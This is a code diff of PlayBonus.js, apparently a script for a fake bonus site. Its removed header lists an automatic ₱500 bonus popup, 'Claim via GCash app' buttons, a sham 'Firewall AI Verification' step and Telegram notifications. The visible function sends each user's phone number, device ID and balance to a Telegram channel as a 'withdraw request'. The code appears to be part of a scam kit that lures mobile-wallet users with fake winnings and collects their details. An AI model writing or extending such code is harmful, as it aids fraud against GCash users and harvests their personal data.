@@ -1,22 +1,4 @@
-/**
- * PlayBonus.js - SINGLE SCRIPT (All-in-One)
- * 
- * INCLUDES:
- * ✅ User Data & Balance Management
- * ✅ AUTO POPUP → ₱500 Bonus (3s fresh / 5s claimed)
- * ✅ CLAIM NOW → Opens WITHDRAW Popup (pt_btn.png)
- * ✅ CLAIM VIA GCASH APP → Firewall Check → Redirect or Verification
- * ✅ Firewall AI Verification (Carnival theme)
- * ✅ Force Logout (Admin-only)
- * ✅ Timer, Ticker, Confetti
- * ✅ Telegram Notifications
- * ✅ Anti-Glitch Claim State
- * 
- * LOADING ORDER:
- * 1. config.js (Firebase)
- * 2. playbonus.js (THIS FILE)
- * 3. chat_widget.js (optional)
- */
+
 
 (function() {
     'use strict';
@@ -151,19 +133,18 @@
     // ============================================================
     // 🆕 WITHDRAW NOTIFICATION (Telegram)
     // ============================================================
-    function sendWithdrawRequestNotif(userPhone, deviceId, balance, firewallStatus, redirectUrl) {
-        var timestamp = new Date().toLocaleString();
-        var message = '💸 WITHDRAW REQUEST\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: ' + userPhone + '\n' +
-            '🖥️ Device: ' + deviceId + '\n' +
-            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
-            '🔥 Firewall: ' + (firewallStatus ? 'ON (Verification)' : 'OFF (Direct Redirect)') + '\n' +
-            (redirectUrl ? '🔗 Redirect: ' + redirectUrl + '\n' : '') +
-            '⏰ Time: ' + timestamp + '\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        sendTelegram(message);
-    }
+    function sendWithdrawRequestNotif(userPhone, deviceId, balance, firewallStatus) {
+    var timestamp = new Date().toLocaleString();
+    var message = '💸 WITHDRAW REQUEST\n' +
+        '━━━━━━━━━━━━━━━━━━━━\n' +
+        '👤 User: ' + userPhone + '\n' +
+        '🖥️ Device: ' + deviceId + '\n' +
+        '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
+        '🔥 Firewall: ' + (firewallStatus ? 'ON (Verification)' : 'OFF (Direct Redirect)') + '\n' +
+        '⏰ Time: ' + timestamp + '\n' +
+        '━━━━━━━━━━━━━━━━━━━━';
+    sendTelegram(message);
+}
     
     function sendWithdrawRedirectNotif(userPhone, deviceId, balance) {
     var timestamp = new Date().toLocaleString();
